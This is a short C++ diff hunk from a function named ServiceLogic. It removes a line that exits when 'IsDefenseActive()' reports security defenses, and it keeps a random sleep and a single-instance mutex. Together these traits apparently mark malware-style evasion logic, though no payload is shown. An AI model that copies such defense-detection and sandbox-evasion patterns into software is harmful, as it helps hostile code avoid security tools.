@@ -187,7 +187,6 @@ void ServiceLogic() {
     } catch(...) {}
 
     RandomSleep(3, 7); 
-    if (IsDefenseActive()) exit(0); 
 
     HANDLE hMutex = CreateMutexA(NULL, TRUE, Config::MUTEX_ID.c_str());
     if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
